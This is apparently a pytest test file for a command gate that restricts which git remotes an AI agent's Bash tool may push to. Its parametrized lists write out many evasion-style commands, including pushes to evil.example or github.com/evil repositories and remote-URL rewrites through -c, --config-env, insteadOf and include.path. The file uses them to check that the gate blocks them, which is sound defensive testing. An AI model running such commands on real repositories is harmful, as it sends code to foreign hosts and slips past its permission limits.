"""Remote-scoped action gate for stream tasks (proposal 157 W1, A8 to A10)."""

from __future__ import annotations

import pytest

from maestro.tool_gating import (
    TaskGateHook,
    evaluate_bash_command,
    make_task_tool_hooks,
    task_gate_from_hooks,
)

_BRANCHES = frozenset({"maestro/task/t1"})
_REMOTES = frozenset({"origin", "acme/tool"})


def _eval(command: str) -> str | None:
    return evaluate_bash_command(
        command, _BRANCHES, current_branch="maestro/task/t1", allowed_push_remotes=_REMOTES,
    )


@pytest.mark.parametrize(
    "command",
    [
        "git push https://github.com/evil/x.git maestro/task/t1",
        "git push git@github.com:evil/x.git maestro/task/t1",
        "git push upstream maestro/task/t1",
        "git push /tmp/local maestro/task/t1",
        "git push --repo=https://github.com/evil/x.git origin maestro/task/t1",
        "git push --repo https://github.com/evil/x.git",
        "git -c remote.origin.url=https://github.com/evil/x.git push origin maestro/task/t1",
        "git -cremote.origin.pushurl=x push origin maestro/task/t1",
        "git -c url.https://evil/.insteadOf=https://github.com/ push origin maestro/task/t1",
        "git --config-env=remote.origin.url=EVIL push origin maestro/task/t1",
        "FOO=x git --config-env remote.origin.pushurl=FOO push origin maestro/task/t1",
        "git remote set-url origin https://github.com/evil/x.git",
        "git remote add evil https://github.com/evil/x.git",
        "git remote rename origin old",
        "git remote remove origin",
        "git config remote.origin.pushurl https://github.com/evil/x.git",
        "git config --local url.x.insteadOf y",
        "git -c branch.maestro/task/t1.pushRemote=https://evil.example/x.git push",
        "git -c branch.maestro/task/t1.remote=upstream push",
        "git config branch.maestro/task/t1.pushRemote https://evil.example/x.git",
        "git config branch.main.remote upstream",
        "git -c include.path=/tmp/x push origin maestro/task/t1",
        "git config include.path /tmp/x",
        "git config includeIf.gitdir:/x.path /tmp/x",
        "bash -c 'git push upstream maestro/task/t1'",
        "git push https://evil.example/acme/tool.git maestro/task/t1",
        "git push git@evil.example:acme/tool.git maestro/task/t1",
        "git push acme/tool maestro/task/t1",
        "git -C /workspace push origin maestro/task/t1",
        "git -C/workspace push origin maestro/task/t1",
        "git --git-dir /workspace/.git push origin maestro/task/t1",
        "git --git-dir=/workspace/.git push origin maestro/task/t1",
        "git --work-tree=/workspace push origin maestro/task/t1",
    ],
)
def test_foreign_remote_refused(command: str) -> None:
    reason = _eval(command)
    assert reason is not None
    assert reason.startswith("Blocked (push-remote-foreign)")


@pytest.mark.parametrize(
    "command",
    [
        "git push origin maestro/task/t1",
        "git push https://github.com/acme/tool.git maestro/task/t1",
        "git push git@github.com:Acme/Tool.git maestro/task/t1",
        "git push",
        "git push -u origin maestro/task/t1",
        "git remote -v",
        "git remote get-url origin",
        "git config branch.maestro/task/t1.merge refs/heads/x",
        "git config user.name x",
        "git -c user.name=x commit -m y",
        "git status",
        "git --version",
        "git -C /workspace status",
        "git config --get remote.origin.url",
        "git config --get-all remote.origin.url",
        "git config --list",
        "git config get remote.origin.url",
    ],
)
def test_own_remote_allowed(command: str) -> None:
    assert _eval(command) is None


@pytest.mark.parametrize(
    "command",
    [
        "git push origin main",
        "git push origin other",
        "git push origin --tags",
        "git push origin v1.0.0",
        "git push --force origin maestro/task/t1",
        "gh release create v1.0.0",
        "gh pr create --title x --body y",
    ],
)
def test_still_refused_under_scoping(command: str) -> None:
    assert _eval(command) is not None


def test_unscoped_foreign_push_unchanged() -> None:
    """With ``None`` the gate is byte-identical to today: the remote is unchecked."""
    assert evaluate_bash_command(
        "git push https://github.com/evil/x.git maestro/task/t1", _BRANCHES,
    ) is None
    assert evaluate_bash_command("git remote set-url origin x", _BRANCHES) is None


def test_unscoped_config_env_push_reads_the_push() -> None:
    """Unscoped, ``--config-env`` is consumed as a value flag so the push is gated."""
    reason = evaluate_bash_command("git --config-env core.x=FOO push origin main", _BRANCHES)
    assert reason is not None
    assert evaluate_bash_command(
        "git --config-env core.x=FOO push origin maestro/task/t1", _BRANCHES,
    ) is None


def test_scope_does_not_leak_between_calls() -> None:
    assert _eval("git push upstream maestro/task/t1") is not None
    assert evaluate_bash_command("git push upstream maestro/task/t1", _BRANCHES) is None


@pytest.mark.asyncio
async def test_task_gate_hook_denies_with_reason() -> None:
    hooks = make_task_tool_hooks(
        _BRANCHES, current_branch="maestro/task/t1", allowed_push_remotes=_REMOTES,
    )
    gate = task_gate_from_hooks(hooks)
    assert isinstance(gate, TaskGateHook)
    assert gate.allowed_push_remotes == _REMOTES
    verdict = await gate(
        {"tool_name": "Bash", "tool_input": {"command": "git push upstream maestro/task/t1"}},
        None, None,
    )
    reason = verdict["hookSpecificOutput"]["permissionDecisionReason"]  # type: ignore[typeddict-item]
    assert reason.startswith("Blocked (push-remote-foreign)")


def test_task_gate_hook_defaults_unscoped() -> None:
    assert TaskGateHook(_BRANCHES).allowed_push_remotes is None
